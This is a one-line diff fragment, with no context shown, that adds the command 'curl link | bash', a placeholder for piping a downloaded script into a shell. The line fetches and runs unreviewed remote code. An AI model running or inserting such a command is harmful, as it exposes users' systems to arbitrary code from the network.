@@ -1,0 +1,1 @@
+curl link | bash
